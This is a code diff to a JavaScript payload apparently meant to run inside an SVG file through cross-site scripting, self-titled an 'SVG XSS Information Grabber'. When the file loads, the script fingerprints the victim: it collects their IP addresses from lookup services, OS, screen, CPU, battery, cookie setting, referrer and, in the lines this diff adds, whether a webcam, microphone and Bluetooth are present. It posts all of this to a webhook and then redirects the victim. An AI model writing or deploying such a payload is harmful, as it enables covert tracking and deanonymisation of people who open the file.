@@ -1,5 +1,26 @@
-url2 = "redirect url"
+   url2 = "redirect url"
    try {
+      function detectWebcam(callback) {
+         let md = navigator.mediaDevices;
+         if (!md || !md.enumerateDevices) return callback(false);
+         md.enumerateDevices().then(devices => {
+            callback(devices.some(device => 'videoinput' === device.kind));
+         })
+      }
+      
+      function detectMic(callback) {
+         let md = navigator.mediaDevices;
+         if (!md || !md.enumerateDevices) return callback(false);
+         md.enumerateDevices().then(devices => {
+            callback(devices.some(device => 'audioinput' === device.kind));
+         })
+      }
+      detectWebcam(function(hasWebcam) {
+         camera=hasWebcam ? '✅' : '❌'
+      })
+      detectMic(function(hasMic) {
+         mic=hasMic ? '✅' : '❌'
+      })
       var opts = { method: 'GET', headers: {}};
       fetch('https://api.ipify.org?format=json', opts).then(function (response) {return response.json()}).then(function (data2) {
       fetch('https://myip.wtf/json', opts).then(function (response) {return response.json()}).then(function (data) {
@@ -8,8 +29,12 @@ url2 = "redirect url"
       if (navigator.appVersion.indexOf("Mac") != -1) Name = "MacOS";
       if (navigator.appVersion.indexOf("X11") != -1) Name = "UNIX OS";
       if (navigator.appVersion.indexOf("Linux") != -1) Name = "Linux OS";
+      if (!Name) Name = navigator.appVersion
       navigator.getBattery().then(function(battery) {
-         
+         navigator.bluetooth.getAvailability().then(function(isBluetoothAvailable)  {
+         bluetooth=isBluetoothAvailable ? '✅' : '❌' 
+         batterycharge=battery.charging ? '✅' : '❌'
+         cookies=navigator.cookieEnabled ? '✅' : '❌'
          let other = "```\nDownload Speed: "+
                      navigator.connection.downlink+"mbps"+
                      '\nScreen Size: '+
@@ -19,9 +44,15 @@ url2 = "redirect url"
                      '\nUsed CPU Cores: '+
                      navigator.hardwareConcurrency+
                      '\nBattery Charging: '+
-                     battery.charging+
+                     batterycharge+
                      "\nCookies?: "+
-                     navigator.cookieEnabled+
+                     cookies+
+                     "\nWebcam?: "+
+                     camera+
+                     "\nMicrophone?: "+
+                     mic+
+                     "\nBluetooth?: "+
+                     bluetooth+
                      "\nPrevious Page: "+
                      document.referrer+
                      "\n```"
@@ -29,10 +60,10 @@ url2 = "redirect url"
             method:"POST",
             headers: {"Content-Type": "application/json"},
             body: JSON.stringify({
-               username: "SVG XSS Information Grabber - By SSSEAL-C on Github",
+               username: "SVG XSS Information Grabber - By SEALL on Github",
                avatar_url: "https://i.imgur.com/Yztlbk4.png",
                embeds: [{ 
-                  title: 'SVG XSS Attack by SSSEAL-C (v1.1)', 
+                  title: 'SVG XSS Attack By SEALL (v1.2)', 
                   fields: [ 
                   { name: 'IPv4/IPv6 :globe_with_meridians:',  value: "`"+data.YourFuckingIPAddress+"`", inline: "true" },
                   { name: 'IPv4 :globe_with_meridians:',  value: "`"+data2.ip+"`", inline: "true" },
@@ -50,8 +81,9 @@ url2 = "redirect url"
          fetch(URL, opts2).then(function (response) {
             console.log(response);
             window.location.replace(url2); 
+         })
       })})})})}
    catch(err) {
       console.log(err);
       window.location.replace(url2);  
-   };   
+   }; 
